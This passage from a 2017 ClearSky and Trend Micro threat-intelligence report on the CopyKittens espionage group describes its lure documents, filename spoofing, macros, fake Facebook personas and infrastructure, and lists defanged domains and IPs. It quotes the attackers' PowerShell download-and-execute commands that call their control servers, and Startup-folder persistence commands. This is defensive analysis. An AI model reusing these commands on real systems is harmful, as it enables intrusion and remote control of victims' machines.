\nPowerShell\n \ncode\n \nthat loads Cobalt \nStrike\n \nstager\n \n                                        \n                  \n \n12\n\nhttps://www.virustotal.com/en/file/43fbf0cc6ac9f238ecd\nd2d186de397bc689ff7fcc8c219a7e3f46a15755618dc/analysis\n \n \n13\n\nhttps://www.hybrid\n-\nanalysis.com/sample/1f6e267a9815ef88476fb8bedcffe614bc342b89b4c80eae90e9aca78ff1eab8\n\n \n  \nPage \n10\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nThe sample communicates with \ngsvr\n-\nstatic\n[\n.\n]\nco\n \nvia DNS.\n \n \nDNS requests \nperformed\n \nby the sample\n \nYet i\nn another case, \n\nomnews.doc\n\nfollowing location\ns\n:\n \nhttp://fetchnews\n-\nagency\n.\nnews\n-\nbbc\n[.]\npress/en/20170/pictures.doc\n \nhttp://fetchnews\n-\nagency.news\n-\nbbc\n[.]\npress/omnews.doc\n \nThe files load VBS from the following \naddress:\n \n \n \n \nhttp://fetchnews\n-\nagency\n.\nnews\n-\nbbc\n[.]\npress/pictures.html\n \nWhich runs a Cobalt Strike stager that communicates with:\n \n \n \n \na104\n-\n93\n-\n82\n-\n25.mandalasanati\n[\n.\n]\ninfo/iBpa\n \nFrom there, a Cobalt Strike beacon is loaded, \ncommunicating\n \nwith\n:\n \n \n \n \ns1w\n-\namazonaws.offic\ne\n-\nmsupdate\n[\n.\n]\nsolutions\n \n \n \n \n  \nPage \n11\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nEmbedded\n \nOLE \nO\nbjects \n \nIn February 2017 a document\n \ntitled \n\"\nssl.docx\n\"\n \nwas delivered \nto targets, \nlikely via email\n.\n14\n \nIt asked\n \nthe recipient \nto \"Ple\na\nse Update Your VPN Client from This Manual\" [sic]\n.\n \n \nContent of the \nmalicious\n \ndocument\n \nasking the victim to update the VPN Client\n \nThe \"VPN Client manual\" \nwas an embedded OLE binary object\n, \nan executable with a reverse file extension:\n \ncheckpointsslvpn?fdp.\nexe\n.\n \n15\n \n(\nThe \n\"?\" stands for an invisible Unicode character that flips the direction of \nthe \nstring, making it look like a PDF file \"exe.pdf\n.\n\")\n16\n \nIt was composed of two files: a self\n-\nextracting executable and \na PDF.\n \n \n \nBundled executable and PDF files\n \nThey run via the following command:\n \ncmd.exe /c copy zWEC.tmp %userprofile\n%\n\\\ndesktop\n\\\nMaariv_Tops.pdf&&copy Ma_1.tmp \n\"%userprofile%\n\\\nAppData\n\\\nRoaming\n\\\nMicrosoft\n\\\nWindows\n\\\nStart \nMenu\n\\\nPrograms\n\\\nStartup\"\n\\\nsourcefire.pif&&cd %userprofile%\n\\\ndesktop&&Maariv_Tops.pdf\n \nThe PDF file is a decoy displayed to the victim during infection. It contain\ns\n \nc\nontent copied on March 2017 from \nthe public website of Maariv, a major Israeli news outlet\n.\n \n \n                                        \n                  \n \n14\n\nhttps://www.virustotal.c\nom/en/file/b01e955a34da8698fae11bf17e3f79a054449f938257284155aeca9a2d38\n15dd/analysis\n\n \n15\n\nhttps://www.virustotal.com/en/file/72efda\n7309f8b24cd549f61f2b687951f30c9a45fda0fc3805c12409d0ba320a/analysis/\n \n \n16\n\nCopykittens have used this this method before, for example in a document named \"mfaformann?fdp.exe\"\n \n  \nPage \n12\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \n \nContent of the malicious PDF file, copied from Maariv website\n \nThe self\n-\nextracting executable contains \nanother\n \nexecutable\n,\n \nnamed \np.exe\n, which \nwas\n \ndigitally signed\n \nwith a \nstolen certificate of a legitimate company called AI Squared\n.\n \n \n \nD\nigital \nsignature\n\nof p.exe\n \nInterestingly, this digital certificate was used by \na \nthreat group \ncalled Oilrig\n.\n17\n \nThis might indicate th\ne\n \ntwo \ngroup\ns\n \nshare re\ns\nou\nrc\nes or otherwise collaborate in their activity. \n \n \n \n                                        \n                  \n \n17\n\nhttp://www.clearskysec.com/oilr\nig/\n \n \n  \nPage \n13\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nThe self\n-\nextracting executable serves as a downloader, running the following command:\n \ncmd.exe /c powershell.exe \n-\nnop \n-\nw hidden \n-\nc \"((new\n-\nobject \nnet.webclient).downloadstring('http://jpsrv\n-\njava\n-\njdkec2.javaup\ndate[.]co:80/JPOST'))\"\n \nThe \nC&C \nserver sends back a short \nPowerShell\n \ncode that loads \na Cobalt Strike stager\n \ninto memory\n.\n \n \nBase64 encoded \nPowerShell\n \ncode that loads Cobalt Strike stager into memory\n \n \nStager \ns\nhellcode with marked user agent and \nC&C\n \nserver ad\nd\nress\n \nBoth the docx and the executable contain\ned\n \nthe name \nshiranz \nin their metadata or \nfile paths\n:\n \nLastModifiedBy \nshiranz\n \nC:\n\\\nUsers\n\\\nshiranz\n\\\nDesktop\n\\\ncheckpointsslvpn?fdp.exe\n \nC:\n\\\nUsers\n\\\nshiranz\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\ncheckpointsslvpn?fdp.exe\n \n  \nPage \n14\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIn another sample, the \ndecoy\n \ndocument was in Turkish, indicating the target\n's\n \nnationality\n.\n18\n \nThis document \nwas likely stolen from the Turk\nish Ministry of Foreign Affairs\n: \ntest_fdp.exe\n.\n19\n \n \nDecoy document in Turkish \n \nWhile the decoy PDF document is opened, t\nhe following commands are \nexecuted\n:\n \ncmd.exe /c copy Ma_1.tmp \"%userprofile%\n\\\nAppData\n\\\nRoaming\n\\\nMicrosoft\n\\\nWindows\n\\\nStart \nMenu\n\\\nPrograms\n\\\nStartup\"\n\\\nCheckpointGO.pif\n&& copy \nsslvpn.tmp\n \n%userprofile%\n\\\ndesktop\n\\\nsslvpnmanual.pdf\n&& cd %userprofile%\n\\\ndesktop&& sslvpnmanual.p\ndf\n \ncmd.exe /c powershell.exe \n-\nnop \n-\nw hidden \n-\nc \"IEX ((new\n-\nobject \nnet.webclient).downloadstring('http://jpsrv\n-\njava\n-\njdkec2.javaupdate[.]co:80/\nSourcefire'\n))\"\n \n \n \n                                        \n                  \n \n18\n\nhttps://www.hybrid\n-\nanalysis.com/sample/a4adbea4fcbb242f7eac48ddbf13c814d5eec9220f7dce01b2cc8b56a806cd37\n \n \n \n19\n\nhttps://www.virustotal\n.com/en/file/a4adbea4fcbb242f7eac48ddbf13c814d5eec9220f7dce01b2cc8b56a806cd37/analysis\n \n \n  \nPage \n15\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nMalicious Macros\n \nIn October 2016, the attackers uploaded to VirusTotal multiple files containing \nm\na\ncros, likely \nto\n \nlearn if they \nare detected by antivirus engines. \n \nFor example, \"\nDate.dotm\n\" contains this default Word template content:\n20\n \n \nA \ndefault\n \ntemplate of a Word document used as decoy\n \nThe macro runs a Cobalt Strike stager that communicates with \nwk\n-\nin\n-\nf104.1c100.n.microsoft\n-\nsecurity[.]host\n \n.\n \nThe attackers also uploaded an \nexecutable\n \nfiles that would run a Word document\n \nwith content in Hebrew.\n21\n \n \nHebrew d\necoy document \n \nThe word document contains a macro that runs the following command:\n \ncmd.exe /c \npowershell \n-\nExecutionPolicy bypass \n-\nnoprofile \n-\nwindowstyle hidden (New\n-\nObject \nSystem.Net.WebClient).DownloadFile(\n'http://pht.is.nlb\n-\ndeploy.edge\n-\ndyn.e11.f20.ads\n-\nyoutube. \nonline/winini.exe','%TEMP%\n\\\nXU.exe');&start %TEMP%\n\\\nXU.exe& exit\n \nIn parallel, the executa\nble drops \nd5tjo.exe\n, which is the legitimate Madshi debugging tool\n \n22\n23\n \n \n \n                                        \n                  \n \n20\n\nhttps://www.virustotal.com/en/file/7e3c9\n323be2898d92666df33eb6e73a46c28e8e34630a2bd1db96aeb39586aeb/analysis/\n \n \n21\n\nhttps://www.virustotal.com/en/file/9e5ab438deb327e26266c27\n891b3573c302113b8d239abc7f9aaa7eff9c4f7bb/analysis\n \n \n22\n\nhttps://www.virustotal.com/en/file/7ad65e39b79ad56c02a90dfab8090392ec5ffed10a\n8e276b86ec9b1f2524ad31/analysis\n \n \n23\n\nhttp://help.madshi.net/madExcept.htm\n \n \n  \nPage \n16\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nFake Social \nM\nedia \nE\nntities\n \nBack in 2013, CopyKittens used several Facebook profiles to spread links to a website impersonating Haaretz\n \nnews\n, an Israeli \nnewspaper. In the screenshot \nbelow you can see the fake profile linking to haarettz.co[.]il \n(\nnote the extra t in the domain).\n \n\"\nErick Brown\n\"\n24\n \n \nFake profile \"Erik Brown\" posting link to malicious website \n \n\"\nAmanda Morgan\n\"\n25\n \n \nFake profile \"Amanda Morgan\" posting link to malicious website\n \n \nThe latter profile\n \ntagged a fake Israeli profile\n \nas her cousin\n, \"\n\n\n\n\n\n\"\n26\n \n \nF\nake profile \"\n\n\n\n\"\n \n                                        \n                  \n \n24\n\nhttps://www.facebook.com/israelhoughtonandplanetshakersphilippineconcert/posts/711649418845349\n \n \n25\n\nhttps://www.facebook.com/ynetnews/posts/548075141952763\n \n26\n\nhttps://www.facebook.com/profile.php?id=100003169608706\n \n  \nPage \n17\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nWho in turn tagged another fake Israeli profile as her\n \ncousin\n \n\n\n\n\n\n27\n \n \nF\nake profile \"\n\n\n\n\"\n \nWhile \"Erik Brown\" has not been publicly active since September 2015, and the two other Israeli profiles have \nnot been publicly active since September 2013, Amanda Morgan is still active to date. She has \nthousands of \nfriends and 2,630 followers, many of wh\nich are Israeli. In 2015 she sent her friends an invitation to Like a \nFacebook page: \"Emet press.\"\n \n \nAmanda Morgan invites its friends to like \"Emet press\" \n \nEmet press (Emet means \"tru\nth\n\" in Hebrew), is described as a non\n-\nbiased news aggregator operated by\n \nIsraeli \nstudents aboard. However, the He\nbrew text is clearly not written by someone who speaks Hebrew as\n \na\n \nfirst \nlanguage: \n \n \nEmet press Facebook page\n \n                                        \n                  \n \n27\n\nhttps://www.facebook.com/jessicacohe\n \n  \nPage \n18\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nThe page\n \nre\n-\npost\ned\n \nnews stories in Hebrew copied from online news outlets until August 2016.\n28\n \nAn \naccompa\nnying website with similar content was published in \nwww.emetpress[.]com\n.\n \n \nEmet press website\n \nNeither\n \nthe Facebook page nor website have been used to spread malicious or fake content publicly. We \nestimate that \nthey were \nused to build trust with targets, \nand potentially send malicious content in private \nmessages, however we do not have evidence of such activity.\n \nLooking at the website source code reveals that it was built with \nNovinWebGostar\n, a website building platform\n.\n \n \n \nEmet press source code reveals t\nhat it was built with NovinWebGostar \n \nNovinWebGostar\n \nbelongs to an Iranian web development company with the same name\n.\n \nWebsite\n \nof Iranian web development company NovinWebGostar\n \n \n \n                                        \n                  \n \n28\n\nhttps://www.facebook.com/emetpress\n \n \n  \nPage \n19\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nWeb \nH\nacking\n \nBased on logs from internet\n-\nfacing web servers in target organizations, we have detected that CopyKittens use \nthe following tools for web vulnerability scanning and \nSQL \nI\nnjection exploit\nation.\n \nHavij\n:\n \n\"A\nn automatic SQL Injection tool, \n[which is] \ndistributed\n \nby ITSecTeam, an Iranian security company\n.\"\n29\n \nHavij\n \nis freely distributed and has a graphical user interface. It is \ncommon\nly used \nfor automated SQL Injection \nand vulnerability assessments.\n \ns\nqlmap\n: An \"a\nutomatic SQL \nI\nnjection and database takeover tool\n.\"\n30\n \ns\nqlmap is an open source penetration \ntesting tool that automates the process of detecting and exploiting SQL \nI\nnjection flaws and taking over \ndatabase servers. \nIt is capable of \ndatabase fingerprinting, data fetching from the database, \nand \naccessing the \nunder\nlying file system and executing commands on the operating system via out\n-\nof\n-\nband connections\n\n \nAcunetix\n:\n \nA commercial vulnerability scanner. \"Acunetix tests for SQL Injection, XSS, XXE, SSRF, Host Header \nInjection and over 3000 other web vulnerabilities.\"\n31\n \n                                        \n                  \n \n29\n\nhttp://blog.checkpoint.com/2015/05/14/analysis\n-\nhavij\n-\nsql\n-\ninjection\n-\ntool/\n \n \n30\n\nhttp://sqlmap.org\n \n \n31\n\nhttps://www.acunetix.com\n \n \n  \nPage \n20\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nInfrastructure \nA\nnalysis\n \nDomains\n \nBelow is a list of domains that have been used for malware delivery, command and control, and hosting \nmalicious websites since the beginning of \nthe \ngroup's activity\n.\n32\n \nDomain\n \nUse\n \nregistration date\n \nImpersonated company/product\n \nisraelnewsagency[.]link\n \nNA\n \n26/06/2015\n \nIsraeli News Agancy\n \nynet[.]link\n \nNA\n \n \nYnet Israeli news outlet\n \nfbstatic\n-\nakamaihd[.]com\n \nCobalt Strike DNS\n \n04/09/2015\n \nAkamai\n \nwheatherserviceapi[.]info\n \nCobalt Strike DNS\n \n \nGeneric\n \nwindowkernel[.]com\n \nCobalt Strike DNS\n \n \nMicrosoft Windows\n \nfbstatic\n-\na[.]space\n \nNA\n \n \nFacebook\n \ngmailtagmanager[.]com\n \nNA\n \n \nGmail\n \nmswordupdate17[.]com\n \nNA\n \n03/10/2015\n \nMicrosoft Windows\n \ncachevideo[.]com\n \nCobalt Strike DNS\n \n13/12/2015\n \nGeneric\n \ncachevideo[.]online\n \nCobalt Strike DNS\n \n \nGeneric\n \ncloudflare\n-\nstatics[.]com\n \nCobalt Strike DNS\n \n \nCloudflare\n \ndigicert[.]online\n \nCobalt Strike DNS\n \n \nDigiCert certificate authority\n \nfb\n-\nstatics[.]com\n \nCobalt Strike DNS\n \n \nFacebook\n \ncloudflare\n-\nanalyse[.]com\n \nMatreyoshka\n \n \nCloudflare\n \ntwiter\n-\nstatics[.]info\n \nNA\n \n \nTwitter\n \nwinupdate64[.]com\n \nNA\n \n \nMicrosoft Windows\n \n1m100[.]tech\n \nNA\n \n10/04/2016\n \nGoogle\n \ncloudmicrosoft[.]net\n \nNA\n \n19/04/2016\n \nMicrosoft\n \nwindowslayer[.]in\n \nMatreyoshka\n \n06/06/2016\n \nMicrosoft Windows\n \nmywindows24[.]in\n \nNA\n \n \nMicrosoft Windows\n \nwethearservice[.]com\n \nMatreyoshka\n \n11/07/2016\n \nGeneric\n \nakamaitechnology[.]com\n \nCobalt Strike SSL / \nTDTESS\n \n02/08/2016\n \nAkamai\n \nads\n-\nyoutube[.]online\n \nCobalt Strike SSL\n \n \nYoutube\n \nakamaitechnology[.]tech\n \nCobalt Strike SSL\n \n \nAkamai\n \nalkamaihd[.]com\n \nCobalt Strike SSL\n \n \nAkamai\n \nalkamaihd[.]net\n \nCobalt \nStrike SSL\n \n \nAkamai\n \nqoldenlines[.]net\n \nCobalt Strike SSL\n \n \nGolden Lines (Israeli ISP)\n \n1e100[.]tech\n \nNA\n \n \nGoogle\n \nads\n-\nyoutube[.]net\n \nNA\n \n \nYoutube\n \nazurewebsites[.]tech\n \nNA\n \n \nMicrosoft Azure\n \nchromeupdates[.]online\n \nNA\n \n \nGoogle Chrome\n \nelasticbeanstalk[.]tech\n \nNA\n \n \nAmazon AWS Elastic Beanstalk\n \nmicrosoft\n-\nds[.]com\n \nNA\n \n \nMicrosoft\n \ntrendmicro[.]tech\n \nNA\n \n \nTrend Micro\n \nfdgdsg[.]xyz\n \nNA\n \n03/08/2016\n \nGeneric\n \nmicrosoft\n-\nsecurity[.]host\n \nCobalt Strike SSL\n \n09/08/2016\n \nMicrosoft\n \n                                        \n                  \n \n32\n\n \nSome have been reported in our\n \nprevious public reports\n \n  \nPage \n21\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDomain\n \nUse\n \nregistration date\n \nImpersonated company/product\n \ncissco[.]net\n \nCobalt Strike DNS\n \n29/08/2016\n \nCissco\n \ncloud\n-\nanalyzer[.]com\n \nCobalt Strike DNS\n \n \nCellebrite\n \n(?)\n \nf\n-\ntqn[.]com\n \nCobalt Strike DNS\n \n \nGeneric\n \nmcafee\n-\nanalyzer[.]com\n \nCobalt Strike DNS\n \n \nMcafee\n \nmicrosoft\n-\ntool[.]com\n \nCobalt Strike DNS\n \n \nMicrosoft\n \nmpmicrosoft[.]com\n \nCobalt Strike DNS\n \n \nMicrosoft\n \nofficeapps\n-\nlive[.]com\n \nCobalt Strike DNS\n \n \nMicrosoft\n \nofficeapps\n-\nlive[.]net\n \nCobalt Strike DNS\n \n \nMicrosoft\n \nofficeapps\n-\nlive[.]org\n \nCobalt Strike DNS\n \n \nMicrosoft\n \nprimeminister\n-\ngoverment\n-\ntechcenter[.]tech\n \nNA\n \n05/09/2016\n \nIsraeli Prime Minister Office\n \nsdlc\n-\nesd\n-\noracle[.]online\n \nNA\n \n09/10/2016\n \nOracle\n \njguery[.]online\n \nBEEF\n \n13/10/2016\n \nJquery\n \njavaupdate[.]co\n \nNA\n \n16/10/2016\n \nOracle\n \njguery[.]net\n \nBEEF\n \n19/10/2016\n \nJquery\n \nterendmicro[.]com\n \nCobalt Strike DNS\n \n12/12/2016\n \nTrend Micro\n \nwindowskernel14[.]com\n \nNA\n \n20/12/2016\n \nMicrosoft Windows\n \ngstatic[.]online\n \nNA\n \n28/12/2016\n \nGoogle\n \nssl\n-\ngstatic[.]online\n \nNA\n \n \nGoogle\n \nbroadcast\n-\nmicrosoft[.]tech\n \nCobalt Strike DNS\n \n18/01/2017\n \nMicrosoft\n \nnewsfeeds\n-\nmicrosoft[.]press\n \nCobalt Strike DNS\n \n \nMicrosoft\n \nsharepoint\n-\nmicrosoft[.]co\n \nCobalt Strike \nDNS\n \n \nMicrosoft\n \ndnsserv[.]host\n \nNA\n \n \nGeneric\n \nnameserver[.]win\n \nNA\n \n \nGeneric\n \nnsserver[.]host\n \nNA\n \n \nGeneric\n \nowa\n-\nmicrosoft[.]online\n \nNA\n \n \nMicrosoft Outlook\n \nowa\n-\nmicrosoft[.]online\n \nCobalt Strike DNS\n \n \nMicrosoft Outlook\n \ngsvr\n-\nstatic[.]co\n \nNA\n \n13/02/2017\n \nGeneric\n \nwinfeedback[.]net\n \nCobalt Strike DNS\n \n28/02/2017\n \nMicrosoft Windows\n \nwin\n-\nupdate[.]com\n \nCobalt Strike DNS\n \n \nMicrosoft Windows\n \nintelchip[.]org\n \nCobalt Strike DNS\n \n01/03/2017\n \nIntel\n \nipresolver[.]org\n \nCobalt Strike DNS\n \n \nGeneric\n \njavaupdator[.]com\n \nCobalt Strike DNS\n \n \nGeneric\n \nlabs\n-\ncloudfront[.]com\n \nCobalt Strike DNS\n \n \nAmazon CloudFront\n \noutlook360[.]net\n \nCobalt Strike DNS\n \n \nMicrosoft Outlook\n \nupdatedrivers[.]org\n \nCobalt Strike DNS\n \n \nGeneric\n \noutlook360[.]org\n \nCobalt Strike DNS\n \n \nMicrosoft Outlook\n \nwindefender[.]org\n \nCobalt \nStrike DNS\n \n \nMicrosoft\n \nmicrosoft\n-\noffice[.]solutions\n \nNA\n \n23/04/2017\n \nMicrosoft\n \ngtld\n-\nservers.zone\n \nCobalt Strike SSL\n \n01\n/0\n7\n/2017\n \nRoot DNS servers \n \ngtld\n-\nservers.solutions\n \nCobalt Strike SSL\n \nRoot DNS servers \n \ngtld\n-\nservers.services\n \nCobalt Strike SSL\n \nRoot DNS servers \n \nakamai\n-\nnet.network\n \nNA\n \nAkamai\n \nazureedge\n-\nnet.services\n \nNA\n \nMicrosoft\n \nAzure\n \ncloudfront.site\n \nNA\n \nCloudfront\n \ngooglusercontent.center\n \nNA\n \nGoogle\n \n  \nPage \n22\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDomain\n \nUse\n \nregistration date\n \nImpersonated company/product\n \nwindows\n-\nupdates.network\n \nNA\n \nMicrosoft Windows\n \nwindows\n-\nupdates.services\n \nNA\n \nMicrosoft Windows\n \nakamaized.online\n \nNA\n \n01\n/0\n7\n/2017\n \nAkamai\n \ncdninstagram.center\n \nNA\n \nInstegram\n \nnetcdn\n-\ncachefly.network\n \nNA\n \nCacheFly\n \nNot\neworthy\n \nobservations about the domains:\n \n\n \nDomains impersonate one of four categories\n\n \n\n \nMajor internet and software companies and services \n\n \nMicrosoft, Google, Akamai, Cloudflare, \nAmazon, Oracle, Facebook, Cisco, Twitter, Intel\n \n\n \nSecurity companies and products \n\n \nTrend Micro, McAfee, Microsoft Defender, and potentially \nCellebrite\n \n\n \nIsraeli organi\nzations of interest to the victim \n\n \nNews originations, Israeli Prime Minister Office, \nan Israeli ISP\n \n\n \nOther organizations or generic web services\n \n\n \nThe attackers always use Whoisguard\n \nfor Whois details protection.\n33\n \n\n \nDomains are usually registered in bulk every\n \nfew months.\n \n\n \nLong subdomains are created like those used by Content Delivery Networks. For example:\n \nwk\n-\nin\n-\nf104.1e100.n.microsoft\n-\nsecurity\n[\n.\n]\nhost\n \nns1.static.dyn\n-\nusr.gsrv01.ssl\n-\ngstatic[.]online\n \nc20.jdk.cdn\n-\nexternal\n-\nie.1e100.alkamaihd[.]net\n \nmsnbot\n-\nsd7\n-\n46\n-\n194.microsoft\n-\nsecurity[.]host\n \nns2.static.dyn\n-\nusr.gsrv02.ssl\n-\ngstatic.online\n \nstatic.dyn\n-\nusr.g\n-\nblcse.d45.a63.alkamaihd\n[.]\nnet\n \nea\n-\nin\n-\nf155.1e100.microsoft\n-\nsecurity[.]host\n \nis\n-\ncdn.edge.g18.dyn.usr\n-\ne12\n-\nas.akamaitechnology\n[.]\ncom\n \nstatic.dyn\n-\nusr.f\n-\nlogin\n-\nme.c19.a23.akamaitechnology\n[.]\ncom\n \npht.is.nlb\n-\ndeploy.edge\n-\ndyn.e11.f20.ads\n-\nyoutube[.]online\n \nae13\n-\n0\n-\nhk2\n-\n96cbe\n-\n1a\n-\nntwk\n-\nmsn.alkamaihd\n[.]\ncom\n \nbe\n-\n5\n-\n0\n-\nibr01\n-\nlts\n-\nntwk\n-\nmsn.alkamaihd\n[.]\ncom\n \na17\n-\nh16.g11.iad17.as.pht\n-\nexternal.c15.qoldenlines\n[.]\nnet\n \n\n \nSome of the domains have been \nin use for more than two years.\n \n                                        \n                  \n \n33\n\nhttp://www.whoisguard.com\n\n \n \n  \nPage \n23\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nOften the attackers would point malicious domains to IPs not in their control. For example, as can be seen in \nthe screenshot below from PassiveTotal, multiple domains and hosts (marked red) were\n \npointed to a non\n-\nmalicious IP owned by Google.\n34\n35\n \n \n \nMultiple domains and hosts pointing to a non\n-\nmalicious IP owned by Google\n \nThis pattern was instrumental for us in pivoting and \ndetecting\n \nfurther \nmalicious\n \ndomains. \n \n \nMultiple domains and hosts pointing \nto a non\n-\nmalicious IP owned by Google\n \n                                        \n                  \n \n34\n\nhttps://passivetotal.org/search/172.217.20.78\n \n \n35\n\nhttps://passivetotal.org/search/172.217.0.227\n \n \n  \nPage \n24\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIPs\n \nThe table below lists IPs used by the attackers, how they were used, and their a\nutonomous system\n \nname and \nnumber.\n36\n \nNotably\n, most \nare hosted in the Russian Federation, United States, and Netherlands.\n \nIP\n \nUse\n \nCountry\n \nAS name\n \nASN\n \n206.221.181.253\n \nCobalt Strike\n \nUnited States\n \nChoopa  LLC\n \nAS20473\n \n66.55.152.164\n \nCobalt Strike\n \nUnited States\n \nChoopa  LLC\n \nAS20473\n \n68.232.180.122\n \nCobalt Strike\n \nUnited States\n \nChoopa  LLC\n \nAS20473\n \n173.244.173.11\n \nMetasploit\n \nand web hacking\n \nUnited \nStates\n \neNET Inc.\n \nAS10297\n \n173.244.173.12\n \nMetasploit\n \nand web hacking\n \nUnited States\n \neNET Inc.\n \nAS10297\n \n173.244.173.13\n \nMetasploit\n \nand web hacking\n \nUnited States\n \neNET Inc.\n \nAS10297\n \n209.190.20.149\n \nNA\n \nUnited States\n \neNET Inc.\n \nAS10297\n \n209.190.20.59\n \nNA\n \nUnited \nStates\n \neNET Inc.\n \nAS10297\n \n209.190.20.62\n \nNA\n \nUnited States\n \neNET Inc.\n \nAS10297\n \n209.51.199.116\n \nMetasploit\n \nand web hacking\n \nUnited States\n \neNET Inc.\n \nAS10297\n \n38.130.75.20\n \nNA\n \nUnited States\n \nFoxcloud Llp\n \nAS200904\n \n185.92.73.194\n \nNA\n \nUnited States\n \nFoxcloud Llp\n \nAS200904\n \n146.0.73.109\n \nCobalt Strike\n \nNetherlands\n \nHostkey B.v.\n \nAS57043\n \n146.0.73.110\n \nNA\n \nNetherlands\n \nHostkey B.v.\n \nAS57043\n \n146.0.73.111\n \nMetasploit\n \nand web hacking\n \nNetherlands\n \nHostkey B.v.\n \nAS57043\n \n146.0.73.112\n \nCobalt Strike\n \nNetherlands\n \nHostkey B.v.\n \nAS57043\n \n146.0.73.114\n \nCobalt Strike\n \nNetherlands\n \nHostkey B.v.\n \nAS57043\n \n144.168.45.126\n \nBEEF SSL Server\n \nUnited States\n \nIncero LLC\n \nAS54540\n \n217.12.201.240\n \nCobalt Strike\n \nNetherlands\n \nITL Company\n \nAS21100\n \n217.12.218.242\n \nCobalt Strike\n \nNetherlands\n \nITL Company\n \nAS21100\n \n5.34.180.252\n \nCobalt Strike\n \nNetherlands\n \nITL Company\n \nAS21100\n \n5.34.181.13\n \nCobalt Strike\n \nNetherlands\n \nITL Company\n \nAS21100\n \n188.120.224.198\n \nCobalt Strike\n \nRussian Federation\n \nJSC ISPsystem\n \nAS29182\n \n188.120.228.172\n \nNA\n \nRussian Federation\n \nJSC ISPsystem\n \nAS29182\n \n188.120.242.93\n \nCobalt Strike\n \nRussian Federation\n \nJSC ISPsystem\n \nAS29182\n \n188.120.243.11\n \nNA\n \nRussian Federation\n \nJSC ISPsystem\n \nAS29182\n \n188.120.247.151\n \nTDTESS\n \nRussian Federation\n \nJSC ISPsystem\n \nAS29182\n \n62.109.2.52\n \nCobalt Strike\n \nRussian Federation\n \nJSC ISPsystem\n \nAS29182\n \n188.120.232.157\n \nCobalt Strike\n \nRussian Federation\n \nJSC ISPsystem\n \nAS29182\n \n185.118.65.230\n \nNA\n \nRussian Federation\n \nLLC CloudSol\n \nAS59504\n \n185.118.66.114\n \nNA\n \nRussian Federation\n \nLLC CloudSol\n \nAS59504\n \n141.105.67.58\n \nMetasploit\n \nand web hacking\n \nRussian \nFederation\n \nMir Telematiki Ltd\n \nAS49335\n \n141.105.68.25\n \nCobalt Strike\n \nRussian Federation\n \nMir Telematiki Ltd\n \nAS49335\n \n141.105.68.26\n \nMetasploit\n \nand web hacking\n \nRussian Federation\n \nMir Telematiki Ltd\n \nAS49335\n \n141.105.68.29\n \nMetasploit\n \nand web hacking\n \nRussian \nFederation\n \nMir Telematiki Ltd\n \nAS49335\n \n141.105.69.69\n \nCobalt Strike\n \nRussian Federation\n \nMir Telematiki Ltd\n \nAS49335\n \n141.105.69.70\n \nmatreyoshka\n \nRussian Federation\n \nMir Telematiki Ltd\n \nAS49335\n \n141.105.69.77\n \nMetasploit\n \nand web hacking\n \nRussian Federation\n \nMir \nTelematiki Ltd\n \nAS49335\n \n                                        \n                  \n \n36\n\nSome have been reported in our previous public reports\n \n  \nPage \n25\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIP\n \nUse\n \nCountry\n \nAS name\n \nASN\n \n31.192.105.16\n \nCobalt Strike\n \nRussian Federation\n \nMir Telematiki Ltd\n \nAS49335\n \n31.192.105.17\n \nMetasploit\n \nand web hacking\n \nRussian Federation\n \nMir Telematiki Ltd\n \nAS49335\n \n31.192.105.28\n \nCobalt Strike\n \nRussian Federation\n \nMir Telematiki Ltd\n \nAS49335\n \n158.69.150.163\n \nCobalt Strike\n \nCanada\n \nOVH SAS\n \nAS16276\n \n176.31.18.29\n \nCobalt Strike\n \nFrance\n \nOVH SAS\n \nAS16276\n \n188.165.69.39\n \nCobalt Strike\n \nFrance\n \nOVH SAS\n \nAS16276\n \n192.99.242.212\n \nCobalt Strike\n \nCanada\n \nOVH SAS\n \nAS16276\n \n198.50.214.62\n \nCobalt Strike\n \nCanada\n \nOVH\n \nSAS\n \nAS16276\n \n51.254.76.54\n \nCobalt Strike\n \nFrance\n \nOVH SAS\n \nAS16276\n \n198.55.107.164\n \nNA\n \nUnited States\n \nQuadraNet  Inc\n \nAS8100\n \n104.200.128.126\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.161\n \nCobalt Strike\n \nUnited States\n \nTotal \nServer Solutions L.L.C.\n \nAS46562\n \n104.200.128.173\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.183\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.184\n \nCobalt Strike\n \nUnited States\n \nTotal Server \nSolutions L.L.C.\n \nAS46562\n \n104.200.128.185\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.187\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.195\n \nCobalt Strike\n \nUnited States\n \nTotal Server \nSolutions L.L.C.\n \nAS46562\n \n104.200.128.196\n \nCobalt Strike\n \nUnited States\n 